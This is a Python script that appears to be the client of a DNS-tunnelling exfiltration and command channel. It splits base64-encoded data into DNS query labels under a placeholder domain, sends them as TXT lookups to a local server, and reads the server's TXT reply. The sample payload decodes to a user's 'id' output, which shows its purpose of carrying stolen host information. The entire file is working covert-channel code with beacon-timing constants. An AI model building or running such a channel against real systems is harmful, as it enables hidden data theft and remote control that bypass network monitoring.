import time
import random
import socket
import base64
from dnslib import DNSRecord, QTYPE
import math
import uuid

BASE_INTERVAL = 5
JITTER = 3

SERVER_IP = "127.0.0.1"
SERVER_PORT = 5353
BASE_DOMAIN = "domain.local"

MAX_FQDN_LEN = 253
MAX_LABEL_LEN = 63

EDNS0 = 4096

DATA = "dWlkPTEwMDAoMHo0aSkgZ2lkPTEwMDAoMHo0aSkgZ3JvdXBzPTEwMDAoMHo0aSksMjQoY2Ryb20pLDI1KGZsb3BweSksMjcoc3VkbyksMjkoYXVkaW8pLDMwKGRpcCksNDQodmlkZW8pLDQ2KHBsdWdkZXYpLDEwMCh1c2VycyksMTAxKG5ldGRldiksMTAyKHNjYW5uZXIpLDEwNShibHVldG9vdGgpLDEwNyhscGFkbWluKQo="

MAX_REQUEST_LEN = 253
MAX_LABEL_LEN = 63

def send_request(domain):
    timeout = 2
    q = DNSRecord.question(domain, "TXT")
    packet = q.pack()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(timeout)
    sock.sendto(packet, (SERVER_IP, SERVER_PORT))

    try:
        data, _ = sock.recvfrom(EDNS0)
        reply = DNSRecord.parse(data)

        for rr in reply.rr:
            if rr.rtype == QTYPE.TXT:
                response_data = rr.rdata.data
                joined_response = b''.join(response_data)

                decoded_response = joined_response.decode('utf-8')
                return decoded_response
        return None
    
    except socket.timeout:
        print("[X] Timeout error from DNS server")
        return None
    finally:
        sock.close()

def calc_allowed_labels(base_len):
    rem_chars = MAX_FQDN_LEN - base_len
    labels_per_request = rem_chars // (MAX_LABEL_LEN + 1)
    return max(1, labels_per_request)


def build_base_len(domain, client_id, mode="load", uid=None):
    if uid:
        base = f"{client_id}.{mode}.{uid}.{domain}"
    else:
        base = f"{client_id}.{mode}.{domain}"
    return len(base)


def split_data(data, group_size):
    return [data[i:i+MAX_LABEL_LEN] for i in range(0, len(data), MAX_LABEL_LEN)]


def group_fragments(fragments, labels_per_request):
    for i in range(0, len(fragments), labels_per_request):
        yield fragments[i:i+labels_per_request]

def build_dns_requests(data):
    uid = str(uuid.uuid4())[:8]
    base_len = build_base_len(BASE_DOMAIN, uid, "load", uid)
    labels_per_request = calc_allowed_labels(base_len)

    fragments = split_data(data, MAX_LABEL_LEN)
    grouped = list(group_fragments(fragments, labels_per_request))

    requests = []

    if len(grouped) == 1:
        req = f"{uid}.result.{fragments[0]}.{BASE_DOMAIN}"
        requests.append(req)
    else:
        total_parts = len(grouped)

        
        requests.append(f"{total_parts}.{uid}.loadstart.{BASE_DOMAIN}")
        idx = 0
        for group in grouped:
            joined = ".".join(group)
            req = f"{joined}.{idx}.{uid}.load.{BASE_DOMAIN}"
            idx = idx + 1
            requests.append(req)
        requests.append(f"{uid}.loadend.{BASE_DOMAIN}")

    return requests

if __name__ == "__main__":
    requests = build_dns_requests(DATA)
    total_requests = len(requests)
    for i, r in enumerate(requests, 1):
        response = send_request(r)
        if i == total_requests:
            print("response:\n\n", response)
